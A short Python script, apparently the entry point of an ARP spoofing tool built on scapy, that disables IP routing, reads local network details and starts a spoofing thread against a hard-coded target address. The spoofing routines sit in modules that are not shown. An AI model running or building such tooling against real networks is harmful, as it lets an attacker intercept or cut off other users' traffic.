import scapy.all as cap
import argparse
import time
import os
import sys
import network
import ui
import daemon
import threading

def start_threads(target_ip, network_info):
    daemon.SafeLoopThread(daemon.spoof, args=[target_ip, network_info['ip']])




def init():
    ui.welcome()

    # disable IP routing
    network.disable_ip_route()

    # get the network information
    network_info = network.get_network()

    # print the network information
    ui.print_network_info(network_info)

    # gather the targets
    targets = ["10.0.4.110"] #ui.gather_targets(network_info['ip_range'])

    print(f"[*] Targets: {targets}")

    # start the threads
    start_threads(targets[0], network_info)

init()